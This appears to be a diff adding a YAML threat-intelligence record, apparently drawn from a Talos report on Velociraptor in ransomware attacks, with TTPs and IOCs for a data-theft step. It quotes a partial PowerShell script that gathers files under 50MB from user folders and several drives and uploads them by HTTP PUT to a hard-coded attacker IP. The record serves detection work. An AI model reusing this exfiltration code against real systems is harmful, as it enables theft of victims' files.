@@ -1,0 +1,54 @@
+description: PowerShell script uploads files from local drives to a remote server.
+TTPs:
+  processes: []
+  commandline: []
+  powershell:
+  - "Where-Object { $_.Length -lt 50MB } | Select-Object -ExpandProperty FullName\n\
+    $uploadScriptBlock = {\n    param ($file, $grValue)\n    try {\n        Add-Type\
+    \ -AssemblyName System.Web\n        $fileName = Split-Path -Path $file -Leaf\n\
+    \        $encodedFileName = [System.Web.HttpUtility]::UrlEncode($fileName)\n \
+    \       $uploadUrl = \"http://65.38.121.226/test/$encodedFileName\"\n        Write-Host\
+    \ \"upload $file to $uploadUrl\"\n        $ProgressPreference = 'SilentlyContinue'\n\
+    \        $maxRetries = 3;$retryCount = 0\n        while ($retryCount -lt $maxRetries)\
+    \ {\n            try {\n                $wc = New-Object System.Net.WebClient;\n\
+    \                $wc.UploadFile($uploadUrl, \"PUT\", $file) | Out-Null\n     \
+    \           Write-Host \"upload Sucess $fileName\"\n                break\n  \
+    \          } catch {\n                $retryCount++\n                Write-Host\
+    \ \"upload $fileName retry $retryCount error: $_\"\n                Start-Sleep\
+    \ -Seconds 2\n            } finally {$wc.Dispose()}\n        }\n    } catch {\n\
+    \        Write-Host \"upload $fileName error: $_\"\n    } finally {$wc.Dispose()}\n\
+    }\n$grValue = GR\n$jobs = @()\nforeach ($file in $files) {\n    while ((Get-Job\
+    \ -State Running).Count -ge $maxConcurrentJobs) {Start-Sleep -Milliseconds 100}\n\
+    \    $jobs += Start-Job -ScriptBlock $uploadScriptBlock -ArgumentList $file, $grValue\n\
+    }\n$jobs | Wait-Job | ForEach-Object {\n    Receive-Job -Job $_ -Keep\n    Remove-Job\
+    \ -Job $_\n} catch { Write-Host \"getfile error: $_\" }\n"
+  scripting_engine: []
+  registry_keys: []
+  image_load: []
+  network_connections:
+  - process: powershell.exe
+    destination_ip: 65.38.121.226
+    destination_port: 80
+    protocol: http
+  file_activity:
+  - path: C:\Users\
+  - path: D:\
+  - path: E:\
+  - path: F:\
+  - path: K:\
+  persistence: []
+  process_relations: []
+IOCs:
+  ip_addresses:
+  - 65.38.121.226
+  domains: []
+  urls:
+  - http://65.38.121.226/test/
+  hashes: []
+authors:
+- Michael Szeliga
+- Aliza Johnson
+- Jaeson Schultz
+reference: https://blog.talosintelligence.com/velociraptor-leveraged-in-ransomware-attacks
+date_of_publication: October 09, 2025
+file_creation_date: October 10, 2025
